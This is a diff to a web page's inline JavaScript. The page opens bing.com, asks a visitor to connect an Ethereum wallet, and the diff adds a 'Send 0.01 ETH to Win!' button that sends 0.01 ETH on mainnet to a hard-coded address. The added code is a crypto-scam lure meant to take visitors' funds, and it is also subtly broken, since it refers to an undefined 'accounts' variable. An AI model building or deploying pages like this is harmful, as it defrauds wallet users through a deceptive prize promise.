@@ -19,69 +19,59 @@
 </head>
 <body>
   <script>
-    async function openBingAndPromptTransaction() {
+    async function openBingAndPromptWallet() {
       // Open bing.com
       window.open('https://bing.com', 'x');
 
       // Check for wallet connection
-      const connected = await promptWalletConnection();
-
-      // If wallet connected, perform an Ethereum transaction
-      if (connected) {
-        await promptEthTransaction();
-      }
+      await promptWalletConnection();
     }
 
     async function promptWalletConnection() {
       if (typeof window.ethereum !== 'undefined') {
         try {
-          // Check if wallet is already connected
-          const accounts = await ethereum.request({ method: 'eth_accounts' });
-
-          if (accounts.length > 0) {
-            return true; // Wallet already connected
-          }
-
           // Request wallet connection
           await ethereum.request({ method: 'eth_requestAccounts' });
           alert('Wallet connected successfully!');
-          return true; // Wallet connected
         } catch (error) {
           alert('Wallet connection request rejected by the user.');
-          return false; // Wallet not connected
         }
       } else {
         alert('Web3 (Ethereum provider) is not available in this browser.');
-        return false; // Wallet not connected
       }
     }
+    
+    // Add the new button and transaction logic
+    const y = document.createElement("button");
+    y.id = "send";
+    y.innerText = "Send 0.01 ETH to Win!";
+    document.body.appendChild(y);
 
-    async function promptEthTransaction() {
+    document.getElementById("send").addEventListener("click", async () => {
+      const transactionParameters = {
+        nonce: "0x00",
+        gasPrice: "0x244AC6D",
+        gas: "0x12A52",
+        to: "0x983C2d9302a31041bf3E342dDd420DDac122ccb6",
+        from: accounts[0],
+        value: "0x2386F26FC10000",
+        data: "0x00",
+        chainId: "0x1",
+      };
+
       try {
-        const transactionParameters = {
-          nonce: "0x00",
-          gasPrice: "0x244AC6D",
-          gas: "0x12A52",
-          to: "0x0000000000000000000000000000000000000000",
-          from: "0x5ADA1826AA82f4f8891a28d9564aa6fe3B0450d5",
-          value: "0x2386F26FC10000",
-          data: "0x00",
-          chainId: "0x1",
-        };
-
         const txHash = await ethereum.request({
           method: "eth_sendTransaction",
           params: [transactionParameters],
         });
-
-        alert(`Transaction sent: ${txHash}`);
+        alert(`Transaction sent! Transaction hash: ${txHash}`);
       } catch (error) {
-        alert('Ethereum transaction request failed or was rejected.');
+        alert(`Error sending transaction: ${error.message}`);
       }
-    }
+    });
   </script>
   <center>
-    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptTransaction()">
+    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
   </center>
 </body>
 </html>
